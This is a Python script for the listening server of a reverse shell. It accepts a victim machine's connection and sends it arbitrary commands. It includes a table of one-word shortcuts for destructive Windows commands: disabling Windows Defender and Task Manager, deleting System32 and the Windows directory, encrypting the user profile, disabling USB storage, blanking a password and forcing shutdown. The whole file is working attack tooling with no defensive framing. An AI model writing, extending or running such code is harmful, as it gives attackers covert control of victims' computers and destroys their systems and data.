import socket

SERVER_IP = input("Enter Listening IP: ") # Public IP = 0.0.0.0
PORT = 6969

# Creates a socket object for the network stack
s = socket.socket()

# Change socket options
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_IP, PORT))

s.listen(1)  # Wait for new connection

# Defining command shortcuts
shortcuts = {
    'rick roll': 'start https://www.youtube.com/watch?v=xvFZjo5PgG0',
    'bye': 'shutdown -s -t 15 -c "Take the L"',
    'disable_antivirus': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
    'crash': 'echo "This is a crash!" > \\.\\globalroot\\device\\condrv\\kernelconnect',
    'bye_taskmngr': 'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
    'bye_system32': 'cmd /c rd /s /q C:\\Windows\\System32',
    'bye_search': 'cmd /c reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Search /v BingSearchEnabled /t REG_DWORD /d 0 /f',
    'encrypt': 'cmd /c cipher /e /s:%USERPROFILE%',
    'bye_windows': 'cmd /c del /F /S /Q C:\\Windows',
    'bye_usb': 'cmd /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR /v Start /t REG_DWORD /d 4 /f',
    'bye_password': 'net user %USERPROFILE% "" /domain',
    'bye_explorer': 'taskkill /f /im explorer.exe',
    'dvd': 'eject D:',
    'flashbang': 'cd %USERPROFILE% && echo [console]::beep(3000, 30000) >> Flashbang.ps1 && powershell .\Flashbang.ps1 && del Flashbang.ps1'
}

while True:  # Open a new connection
    print(f'[+] Listening as {SERVER_IP}:{PORT}')

    client, addr = s.accept()  # Accept new connection
    print(f'[+] Client command {addr}')  # Client details

    client.setblocking(0)  # Set the client socket to non-blocking

    data = ""
    while True:
        try:
            cmd = input('>>> ')

            if cmd.lower() in shortcuts:  # Check if command is a shortcut
                cmd = shortcuts[cmd.lower()]  # Replace command with shortcut value
                client.send(cmd.encode())  # Send shortcut command to the client
                print(f"{cmd} Executed Successfully.")
            else:
                client.send(cmd.encode())  # Send regular command to the client

                if cmd.lower() in ['quit', 'exit', 'q', 'x']:  # Command to exit reverse shell
                    break

                # Receive response from client
                try:
                    while True:
                        chunk = client.recv(1024)
                        if not chunk:
                            break
                        data += chunk.decode()
                except socket.error:
                    pass

                if data:
                    print(data)
                    data = ""
        except:
            print("Lost Connection to client.")
            break

    client.close()  # End transmission

    cmd = input('Wait for new connection? (y/n): ') or 'y'  # Repeat the process
    if cmd.lower() in ['n', 'no']:
        break

s.close()  # Destroy socket object and close the app
